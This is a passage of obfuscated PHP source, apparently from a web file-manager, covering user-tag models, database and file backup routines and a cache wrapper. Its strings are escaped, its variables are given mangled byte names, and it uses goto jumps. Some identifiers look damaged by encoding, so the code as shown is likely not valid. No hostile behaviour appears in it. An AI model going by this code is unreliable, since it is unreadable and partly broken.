"\x75\x73\145\x72\x5f\x6f\x70\164\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($÷††ûÎ¤) { $©÷ÜÙ€¨ =& $_SERVER[ÏÒ Ì„]; if (!defined($©÷ÜÙ€¨[468])) { define($©÷ÜÙ€¨[468], 0); } return "\x55\x73\145\x72\117\x70\164\x69\x6f\x6e\137{$÷††ûÎ¤}\x5f" . USER_ID; } protected function filterWhere($Ùí·ø’) { $ÌšÉöÃê =& $_SERVER[ÏÒ Ì„]; if (!defined($ÌšÉöÃê[468])) { define($ÌšÉöÃê[468], 0); } $Ùí·ø’[$ÌšÉöÃê[1578]] = USER_ID; return $Ùí·ø’; } public function cacheRemoveUser($Õ¯ÌŸ…, $ƒµÑƒÖŒ) { return Cache::remove("\125\163\x65\162\117\160\164\x69\157\x6e\137{$Õ¯ÌŸ…}\x5f" . $ƒµÑƒÖŒ); } protected function optionDefault($ˆİİ™˜ö = '') { $ìçµ¬É¨ =& $_SERVER[ÏÒ Ì„]; if ($ˆİİ™˜ö == $ìçµ¬É¨[33]) { return $GLOBALS[$ìçµ¬É¨[6]][$ìçµ¬É¨[2220]]; } if ($ˆİİ™˜ö == $ìçµ¬É¨[2221]) { return $GLOBALS[$ìçµ¬É¨[6]][$ìçµ¬É¨[2222]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\x72\56\x74\141\147\x4c\151\163\164"; public $modelType = "\125\163\x65\x72\x4f\x70\x74\151\157\156"; public $field = array("\x6e\x61\155\145", "\163\164\171\x6c\145", "\163\157\162\164"); public function listData($…‚Ê¸Í¤ = false, $ïôÀŸˆø = "\x73\157\x72\164", $Ñ¥åÎÙê = false) { return parent::listData($…‚Ê¸Í¤, $ïôÀŸˆø, $Ñ¥åÎÙê); } public function remove($ÕúÛØ€) { return parent::remove($ÕúÛØ€); } public function add($ïÎå˜ğ¹, $‚úğÛÃ– = "\x6c\x61\142\x65\x6c\55\147\x72\145\171\x2d\x6e\157\162\x6d\x61\154") { $¼­¾ñ»å =& $_SERVER[ÏÒ Ì„]; if ($this->findByName($ïÎå˜ğ¹)) { return !1; } $¬á€”Ñ = array($¼­¾ñ»å[415] => $ïÎå˜ğ¹, $¼­¾ñ»å[478] => $‚úğÛÃ–, $¼­¾ñ»å[1750] => $this->getSort($¼­¾ñ»å[256]) + 1); return parent::insert($¬á€”Ñ); } public function update($äƒ—ÑøÒ, $Üğå½ÎĞ) { $”‹È°ë¼ =& $_SERVER[ÏÒ Ì„]; $È‹Ñòç» = $this->listData($äƒ—ÑøÒ); $º‹“áØ = $this->findByName($Üğå½ÎĞ[$”‹È°ë¼[28]]); if (!$È‹Ñòç» || $º‹“áØ && $º‹“áØ[$”‹È°ë¼[395]] != $È‹Ñòç»[$”‹È°ë¼[395]]) { return !1; } return parent::update($äƒ—ÑøÒ, $Üğå½ÎĞ); } public function moveTop($èøù†±) { $öÇìÁà‚ =& $_SERVER[ÏÒ Ì„]; $·§Ääš‡ = parent::listData(); $ç±äáÂØ = $this->getSort($öÇìÁà‚[255]); foreach ($·§Ääš‡ as &$«òÓÕ–Ô) { if ($«òÓÕ–Ô[$öÇìÁà‚[395]] == $èøù†±) { $«òÓÕ–Ô[$öÇìÁà‚[1769]] = $ç±äáÂØ; continue; } $«òÓÕ–Ô[$öÇìÁà‚[1769]] += 1; } unset($«òÓÕ–Ô); return parent::resetData($·§Ääš‡); } public function moveBottom($òÉ›ïî) { $ğ¹ô›Å¥ =& $_SERVER[ÏÒ Ì„]; $“ºï¦„ = $this->getSort($ğ¹ô›Å¥[256]) + 1; return parent::update($òÉ›ïî, array($ğ¹ô›Å¥[1769] => $“ºï¦„)); } public function resetSort($Æˆ §º‘) { $ü™¨ ñé =& $_SERVER[ÏÒ Ì„]; $“Æµ“Ô” = array(); $Æˆ §º‘ = is_array($Æˆ §º‘) ? $Æˆ §º‘ : array(); for ($İıû‰‹÷ = 0; $İıû‰‹÷ < count($Æˆ §º‘); $İıû‰‹÷++) { $“Æµ“Ô”[$Æˆ §º‘[$İıû‰‹÷] . $ü™¨ ñé[33]] = $İıû‰‹÷ + 1; } $¤±Ë¨ê¿ = parent::listData(); foreach ($¤±Ë¨ê¿ as &$°äŞûÃ) { $¦ı¬Ÿ…Ó = $“Æµ“Ô”[$°äŞûÃ[$ü™¨ ñé[395]]]; $°äŞûÃ[$ü™¨ ñé[1769]] = $¦ı¬Ÿ…Ó ? $¦ı¬Ÿ…Ó : $°äŞûÃ[$ü™¨ ñé[1769]]; } unset($°äŞûÃ); return parent::resetData($¤±Ë¨ê¿); } private function getSort($§¡ƒÑ®è) { $³Ó–ú‚ =& $_SERVER[ÏÒ Ì„]; $ª½ÉÛë« = parent::listData(); $¢Øìƒ£ = array_to_keyvalue($ª½ÉÛë«, $³Ó–ú‚[33], $³Ó–ú‚[1769]); if (!$¢Øìƒ£) { $¢Øìƒ£ = array(0); } $İ„áËÃ = $§¡ƒÑ®è == $³Ó–ú‚[256] ? max($¢Øìƒ£) : min($¢Øìƒ£); return intval($İ„áËÃ); } } goto EÒìè……ãÔ; C›ôåÜ®Äß: class BackupDbFile { public function __construct() { } public function index() { $³è­ş° =& $_SERVER[ÏÒ Ì„]; $«èõ«ÃÀ = Backup::get(); $Û’·”•Ş = $«èõ«ÃÀ[$³è­ş°[28]]; $ÁåŞúé = $this->tmpFilesPath() . "\142\141\143\x6b\x75\x70\137{$Û’·”•Ş}\57"; $ŒÍñÁõù = $this->backupPath($«èõ«ÃÀ); if (!($ŒÍñÁõù = IO::mkdir($ŒÍñÁõù))) { return !1; } $ãŒ§ôÑÈ = IO::listPath($ÁåŞúé); $ÄØªáˆš = isset($ãŒ§ôÑÈ[$³è­ş°[74]]) ? $ãŒ§ôÑÈ[$³è­ş°[74]] : array(); $¿Ï“ŸÆ = array_sum(array_column($ÄØªáˆš, $³è­ş°[78])); if (!$¿Ï“ŸÆ) { return !1; } $±»Î¼£ô = array($³è­ş°[794] => $¿Ï“ŸÆ, $³è­ş°[795] => time()); Backup::set($±»Î¼£ô); $ô¯Ñ—» = new TaskFileTransfer($³è­ş°[796], $³è­ş°[772], count($ÄØªáˆš), LNG($³è­ş°[773]) . $³è­ş°[454] . LNG($³è­ş°[775]) . $³è­ş°[797]); $ô¯Ñ—»->task[$³è­ş°[753]] = $¿Ï“ŸÆ; foreach ($ãŒ§ôÑÈ[$³è­ş°[74]] as $ÈÔÏ÷÷) { $Í¼¶øÅ‹ = IO::move($ÈÔÏ÷÷[$³è­ş°[76]], $ŒÍñÁõù); if (!$Í¼¶øÅ‹) { $ô¯Ñ—»->end(); $¤§½›çÉ = IO::getLastError($³è­ş°[798] . $ÈÔÏ÷÷[$³è­ş°[76]] . $³è­ş°[799] . $ŒÍñÁõù . $³è­ş°[530]); write_log($¤§½›çÉ, $³è­ş°[772]); return !1; } } $ìÀï ‰ª = CONTROLLER_DIR . $³è­ş°[800]; $ü×Ñ³àè = CONTROLLER_DIR . $³è­ş°[801]; IO::copy($ìÀï ‰ª, $ŒÍñÁõù); IO::copy($ü×Ñ³àè, $ŒÍñÁõù); $ô¯Ñ—»->end(); $±»Î¼£ô = array($³è­ş°[802] => $¿Ï“ŸÆ, $³è­ş°[803] => time()); Backup::set($±»Î¼£ô); return !0; } private function backupPath($‘†ñÈú) { $™²…Åæ£ =& $_SERVER[ÏÒ Ì„]; $“äÈ °‚ = $‘†ñÈú[$™²…Åæ£[28]]; $•Î÷—ïâ = Model($™²…Åæ£[760])->get($™²…Åæ£[761]); $ÊÎó«Ùµ = substr(md5($™²…Åæ£[762] . $•Î÷—ïâ . $“äÈ °‚), 0, 8); return "\x7b\x69\x6f\72{$‘†ñÈú[$™²…Åæ£[742]]}\175\x2f\144\x61\x74\x61\x62\141\x73\x65\x2f\142\141\x63\x6b\165\x70\57" . $“äÈ °‚ . $™²…Åæ£[71] . $ÊÎó«Ùµ; } private function tmpFilesPath() { $˜¬¤åâ° =& $_SERVER[ÏÒ Ì„]; $È‰ï«±Ö = TEMP_FILES; if ($GLOBALS[$˜¬¤åâ°[6]][$˜¬¤åâ°[88]][$˜¬¤åâ°[792]]) { $È‰ï«±Ö = $GLOBALS[$˜¬¤åâ°[6]][$˜¬¤åâ°[88]][$˜¬¤åâ°[792]]; if (!mk_dir($È‰ï«±Ö) || !is_writable($È‰ï«±Ö) || !IO::mkfile($È‰ï«±Ö . $˜¬¤åâ°[793])) { $È‰ï«±Ö = TEMP_FILES; } } return $È‰ï«±Ö; } } class BackupFile { public function __construct() { } public function index() { $±œà¹ëä = Backup::get(); $¦ûğ€çô = $±œà¹ëä[$_SERVER[ÏÒ Ì„][291]][$_SERVER[ÏÒ Ì„][193]][$_SERVER[ÏÒ Ì„][461]]; $å±ÌÆï = array($_SERVER[ÏÒ Ì„][462] => array($_SERVER[ÏÒ Ì„][804], $¦ûğ€çô), $_SERVER[ÏÒ Ì„][805] => array($_SERVER[ÏÒ Ì„][329], $±œà¹ëä[$_SERVER[ÏÒ Ì„][742]])); $‡ı•†»‚ = (int) Model($_SERVER[ÏÒ Ì„][777])->where($å±ÌÆï)->count($_SERVER[ÏÒ Ì„][461]); $–ˆã²ÈÜ = (int) Model($_SERVER[ÏÒ Ì„][777])->where($å±ÌÆï)->sum($_SERVER[ÏÒ Ì„][78]); $ÏÇ–²Â = new TaskFileTransfer($_SERVER[ÏÒ Ì„][806], $_SERVER[ÏÒ Ì„][772], $‡ı•†»‚, LNG($_SERVER[ÏÒ Ì„][773]) . $_SERVER[ÏÒ Ì„][774] . LNG($_SERVER[ÏÒ Ì„][807])); $ÏÇ–²Â->task[$_SERVER[ÏÒ Ì„][753]] = $–ˆã²ÈÜ; $ÉË³¿ = array($_SERVER[ÏÒ Ì„][808] => $‡ı•†»‚, $_SERVER[ÏÒ Ì„][809] => $–ˆã²ÈÜ, $_SERVER[ÏÒ Ì„][810] => time()); Backup::set($ÉË³¿); $ì£µ°Ú¨ = !0; $Ñƒ¤» = $this->storeIds(); $ƒ•©Ó­ = 1; $û¦ÔÊ‚ = 1000; $²çÚ›‡İ = $°­™¹È· = 0; $â¬›ù¼ú = array(); $Ç‰ø´ùÄ = $…îñƒüç = 0; do { $¸ÌåÙ¸ = $_SERVER[ÏÒ Ì„][811]; $œŠöˆ±Ç = Model($_SERVER[ÏÒ Ì„][777])->where($å±ÌÆï)->field($¸ÌåÙ¸)->order($_SERVER[ÏÒ Ì„][812])->selectPage($û¦ÔÊ‚, $ƒ•©Ó­); $ùÊ·Ìûí = !empty($œŠöˆ±Ç[$_SERVER[ÏÒ Ì„][367]]) ? $œŠöˆ±Ç[$_SERVER[ÏÒ Ì„][367]] : array(); foreach ($ùÊ·Ìûí as $Ê’²ËÑÊ) { if (!$this->_fileExist($Ê’²ËÑÊ, $â¬›ù¼ú, $Ñƒ¤»)) { $‡ı•†»‚ -= 1; $–ˆã²ÈÜ -= (int) $Ê’²ËÑÊ[$_SERVER[ÏÒ Ì„][78]]; write_log("\x66\151\154\145\x20\x6e\x6f\x74\x20\x65\x78\151\x73\x74\56\146\151\154\x65\111\x44\x3a{$Ê’²ËÑÊ[$_SERVER[ÏÒ Ì„][461]]}\54\40\x70\141\164\150\x3a{$Ê’²ËÑÊ[$_SERVER[ÏÒ Ì„][76]]}", $_SERVER[ÏÒ Ì„][813]); continue; } $Éø˜¤à… = $Ê’²ËÑÊ[$_SERVER[ÏÒ Ì„][76]]; $™¾™ÔıÜ = "\x7b\x69\x6f\x3a{$±œà¹ëä[$_SERVER[ÏÒ Ì„][742]]}\x7d" . substr($Éø˜¤à…, strlen("\x7b\151\x6f\72{$Ê’²ËÑÊ[$_SERVER[ÏÒ Ì„][814]]}\175")); if (IO::exist($™¾™ÔıÜ)) { $ÏÇ–²Â->updateFileEnd($Ê’²ËÑÊ[$_SERVER[ÏÒ Ì„][28]], $Ê’²ËÑÊ[$_SERVER[ÏÒ Ì„][78]]); } else { $™¾™ÔıÜ = get_path_father($™¾™ÔıÜ); IO::mkdir($™¾™ÔıÜ); if (!IO::copy($Éø˜¤à…, $™¾™ÔıÜ, $_SERVER[ÏÒ Ì„][815])) { write_log($_SERVER[ÏÒ Ì„][816] . $Éø˜¤à… . $_SERVER[ÏÒ Ì„][799] . $™¾™ÔıÜ . $_SERVER[ÏÒ Ì„][530], $_SERVER[ÏÒ Ì„][772]); $ì£µ°Ú¨ = !1; break; } } $¦ûğ€çô = $Ê’²ËÑÊ[$_SERVER[ÏÒ Ì„][461]]; $°­™¹È· += 1; $²çÚ›‡İ += $Ê’²ËÑÊ[$_SERVER[ÏÒ Ì„][78]]; $…îñƒüç += 1; $Ç‰ø´ùÄ += $Ê’²ËÑÊ[$_SERVER[ÏÒ Ì„][78]]; if ($²çÚ›‡İ >= 1024 * 1024 * 100) { $ÉË³¿ = array($_SERVER[ÏÒ Ì„][817] => $¦ûğ€çô, $_SERVER[ÏÒ Ì„][818] => $…îñƒüç, $_SERVER[ÏÒ Ì„][819] => $Ç‰ø´ùÄ); Backup::set($ÉË³¿); $²çÚ›‡İ = $°­™¹È· = 0; } } $ÆÄ²Á„® = count($ùÊ·Ìûí); $ƒ•©Ó­++; } while ($ÆÄ²Á„® == $û¦ÔÊ‚); $ÏÇ–²Â->end(); $ÉË³¿ = array($_SERVER[ÏÒ Ì„][820] => 1, $_SERVER[ÏÒ Ì„][490] => time(), $_SERVER[ÏÒ Ì„][765] => 1, $_SERVER[ÏÒ Ì„][817] => $¦ûğ€çô, $_SERVER[ÏÒ Ì„][809] => $–ˆã²ÈÜ, $_SERVER[ÏÒ Ì„][808] => $‡ı•†»‚, $_SERVER[ÏÒ Ì„][821] => time()); if ($°­™¹È·) { $ÉË³¿[$_SERVER[ÏÒ Ì„][818]] = $…îñƒüç; $ÉË³¿[$_SERVER[ÏÒ Ì„][819]] = $Ç‰ø´ùÄ; } Backup::set($ÉË³¿); $this->_fileFilter($â¬›ù¼ú); return !0; } private function _fileExist($‚•ùŞÆ›, &$©åô»Æº, $º¯“ì…”) { $ÂßìÎùÙ =& $_SERVER[ÏÒ Ì„]; $™Ş¼—Œ = $‚•ùŞÆ›[$ÂßìÎùÙ[76]]; if (in_array($‚•ùŞÆ›[$ÂßìÎùÙ[461]], $©åô»Æº)) { return !1; } if (!in_array($‚•ùŞÆ›[$ÂßìÎùÙ[814]], $º¯“ì…”)) { return !1; } if (IO::exist($™Ş¼—Œ)) { return !0; } $îËÄ÷Âñ = get_path_father($™Ş¼—Œ); if (IO::exist($îËÄ÷Âñ)) { $©åô»Æº[] = $‚•ùŞÆ›[$ÂßìÎùÙ[461]]; return !1; } $ğ˜º´ûÎ = array($ÂßìÎùÙ[814] => $‚•ùŞÆ›[$ÂßìÎùÙ[814]], $ÂßìÎùÙ[76] => array($ÂßìÎùÙ[381], "{$îËÄ÷Âñ}\x25")); $ì®€åä¢ = Model($ÂßìÎùÙ[777])->where($ğ˜º´ûÎ)->field($ÂßìÎùÙ[462])->select(); $©åô»Æº = array_merge($©åô»Æº, array_to_keyvalue($ì®€åä¢, $ÂßìÎùÙ[33], $ÂßìÎùÙ[461])); return !1; } private function _fileFilter($‹ü¯ïÑÚ) { $ìÇŒ ÚÒ =& $_SERVER[ÏÒ Ì„]; if (empty($‹ü¯ïÑÚ)) { return; } $ËÊŸí¾ø = array($ìÇŒ ÚÒ[461] => array($ìÇŒ ÚÒ[7], array_unique($‹ü¯ïÑÚ))); $Í½Áë¬’ = Model($ìÇŒ ÚÒ[822])->where($ËÊŸí¾ø)->field($ìÇŒ ÚÒ[397])->select(); foreach ($Í½Áë¬’ as $íÅ èÙ®) { Model($ìÇŒ ÚÒ[822])->remove($íÅ èÙ®[$ìÇŒ ÚÒ[397]], !1); } } private function storeIds() { $Üµ£´±“ =& $_SERVER[ÏÒ Ì„]; $ºÍä®· = Model($Üµ£´±“[757])->listData(); $ëİä¨¼ = array(); $ú¦¬æçÁ = $GLOBALS[$Üµ£´±“[6]][$Üµ£´±“[88]][$Üµ£´±“[823]]; foreach ($ºÍä®· as $úáÅ Ññ) { $ò‡à„ÅÌ = strtolower($úáÅ Ññ[$Üµ£´±“[94]]); if (!isset($ú¦¬æçÁ[$ò‡à„ÅÌ])) { continue; } $Æ¸ßÈÎ½ = $Üµ£´±“[72] . (isset($ú¦¬æçÁ[$ò‡à„ÅÌ]) ? $ú¦¬æçÁ[$ò‡à„ÅÌ] : ucfirst($ò‡à„ÅÌ)); if (!class_exists($Æ¸ßÈÎ½)) { continue; } $ëİä¨¼[] = $úáÅ Ññ[$Üµ£´±“[395]]; } return $ëİä¨¼; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $†ºåú­¥ =& $_SERVER[ÏÒ Ì„]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $š“ÜÛøĞ = $GLOBALS[$†ºåú­¥[6]][$†ºåú­¥[347]]; $«°ñ­­ = $š“ÜÛøĞ[$š“ÜÛøĞ[$†ºåú­¥[824]]]; $±úÑò“  = $š“ÜÛøĞ[$†ºåú­¥[825]]; switch ($š“ÜÛøĞ[$†ºåú­¥[824]]) { case $†ºåú­¥[17]: self::$handle = Model($†ºåú­¥[826]); break; case $†ºåú­¥[827]: self::$handle = new CacheRedis($«°ñ­­, $±úÑò“ ); break; case $†ºåú­¥[828]: self::$handle = new CacheMemcached($«°ñ­­, $±úÑò“ ); break; case $†ºåú­¥[193]: self::$handle = new CacheFile($«°ñ­­, $±úÑò“ ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($³¡€ô®á) { if (is_array($³¡€ô®á) || is_object($³¡€ô®á)) { $³¡€ô®á = json_encode($³¡€ô®á); } $³¡€ô®á = rawurlencode($³¡€ô®á); return md5(KOD_SITE_ID . $_SERVER[ÏÒ Ì„][71] . $³¡€ô®á); } public static function get($¼‚¥»æ˜, $êéòó¡ = false) { $¶ÆœØı„ = self::key($¼‚¥»æ˜); if ($êéòó¡) { return unserialize(self::init()->get($¶ÆœØı„)); } if (!isset(self::$memoryCache[$¶ÆœØı„])) { $è§ò¿î = self::init()->get($¶ÆœØı„); self::$memoryCache[$¶ÆœØı„] = unserialize($è§ò¿î); } return self::$memoryCache[$¶ÆœØı„]; } public static function set($ÅÈÍõş§, $Ê”ú”­æ, $âÇØ±©Ó = false) { $Œ¬‚•Î› = self::key($ÅÈÍõş§); if (isset(self::$memoryCache[$Œ¬‚•Î›]) && self::$memoryCache[$Œ¬‚•Î›] === $Ê”ú”­æ) { return !0; } if ($âÇØ±©Ó === 0) { self::$memoryCache[$Œ¬‚•Î›] = $Ê”ú”­æ; return !0; } CacheLock::lock($ÅÈÍõş§); $³×…ÉØ = self::init()->set($Œ¬‚•Î›, serialize($Ê”ú”­æ), $âÇØ±©Ó); self::$memoryCache[$Œ¬‚•Î›] = $Ê”ú”­æ; CacheLock::unlock($ÅÈÍõş§); return $³×…ÉØ; } public static function getCall($ûÖûº„Á, $ùÌ·ôÁ¿, $ùŞ·©€, $İÅ“»ù = array()) { $Î€¡û™ =& $_SERVER[ÏÒ Ì„]; $ÌšĞˆª = self::get($ûÖûº„Á); if ($ÌšĞˆª || $ÌšĞˆª === $Î€¡û™[33]) { return $ÌšĞˆª; } $ÌšĞˆª = call_user_func_array($ùŞ·©€, $İÅ“»ù); $ÌšĞˆª = $ÌšĞˆª ? $ÌšĞˆª : $Î€¡û™[33]; self::set($ûÖûº„Á, $ÌšĞˆª, $ùÌ·ôÁ¿); return $ÌšĞˆª; } public static function remove($È•¾í) { $¨òóÛ´‚ = self::key($È•¾í); unset(self::$memoryCache[$¨òóÛ´‚]); self::clearTimeout(); CacheLock::lock($È•¾í); $¿ú®ŠÛ = self::init()->remove($¨òóÛ´‚); CacheLock::unlock($È•¾í); return $¿ú®ŠÛ; } public static function removeMemory($Ÿ™Ç–Ê) { $â³’âËµ = self::key($Ÿ™Ç–Ê); unset(self::$memoryCache[$â³’âËµ]); } public static function clearMemory($ŞòÅÕ‚™ = false) { if ($ŞòÅÕ‚™) { $ŞòÅÕ‚™ = self::key($ŞòÅÕ‚™); unset(self::$memoryCache[$ŞòÅÕ‚™]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ÏÒ Ì„][829])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ÏÒ Ì„][830])) { self::init()->clearTimeout(); } } } goto A—ŞÔùêÁÍ; EÒìè……ãÔ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\162\x5f\x66\x61\x76"; protected function cacheFunctionAlias($—É¦šê) { $ÀĞêƒè© =& $_SERVER[ÏÒ Ì„]; return array($ÀĞêƒè©[1856] => array(USER_ID, $ÀĞêƒè©[1857])); } protected function listData() { $Õªò¯È’ =& $_SERVER[ÏÒ Ì„]; $•½Ñõâ“ = array($Õªò¯È’[1569] => USER_ID, $Õªò¯È’[477] => array($Õªò¯È’[1860], 0)); $›É³å§ = $Õªò¯È’[1862]; $Ö¿÷¼‘„ = $this->field($›É³å§)->where($•½Ñõâ“)->order($Õªò¯È’[1863])->select(); return $Ö¿÷¼‘„ ? $Ö¿÷¼‘„ : array(); } protected function listByTag($‚ëİÁèÜ) { } protected function addToTag($‡ãó ¤…, $—òËÔ·İ) { $¼íÑ«¨  =& $_SERVER[ÏÒ Ì„]; if (!Model($¼íÑ«¨ [1996])->listData($—òËÔ·İ) || !Model($¼íÑ«¨ [822])->pathInfo($‡ãó ¤…)) { return !1; } $ş¥¬†ãó = array($¼íÑ«¨ [1569] => USER_ID, $¼íÑ«¨ [477] => $—òËÔ·İ, $¼íÑ«¨ [416] => $‡ãó ¤…, $¼íÑ«¨ [417] => $¼íÑ«¨ [411], $¼íÑ«¨ [415] => $¼íÑ«¨ [33], $¼íÑ«¨ [1750] => 0); if ($this->where($ş¥¬†ãó)->find()) { return !1; } return $this->add($ş¥¬†ãó); } protected function removeFromTag($à¹úññ, $åïô­ûû) { $ ¯„ş±Ò =& $_SERVER[ÏÒ Ì„]; if (!Model($ ¯„ş±Ò[1996])->listData($åïô­ûû)) { return !1; } if (is_array($à¹úññ)) { $à¹úññ = array($ ¯„ş±Ò[7], $à¹úññ); } $í†¬Û¥ß = array($ ¯„ş±Ò[1569] => USER_ID, $ ¯„ş±Ò[477] => $åïô­ûû, $ ¯„ş±Ò[417] => $ ¯„ş±Ò[411], $ ¯„ş±Ò[416] => $à¹úññ); return $this->where($í†¬Û¥ß)->delete(); } protected function removeByTag($Ğşö‹½½) { $•’Ëå©Ã =& $_SERVER[ÏÒ Ì„]; if (!$Ğşö‹½½) { return !1; } $õÛœ—×Ÿ = array($•’Ëå©Ã[1569] => USER_ID, $•’Ëå©Ã[477] => $Ğşö‹½½); return $this->where($õÛœ—×Ÿ)->delete(); } protected function removeBySource($š â‹µ) { $­Ø‰ŸÄ¼ =& $_SERVER[ÏÒ Ì„]; if (is_array($š â‹µ)) { $š â‹µ = array($­Ø‰ŸÄ¼[7], $š â‹µ); } $²‘í·şÔ = array($­Ø‰ŸÄ¼[1569] => USER_ID, $­Ø‰ŸÄ¼[416] => $š â‹µ, $­Ø‰ŸÄ¼[477] => array($­Ø‰ŸÄ¼[1008], 0)); return $this->where($²‘í·şÔ)->delete(); } }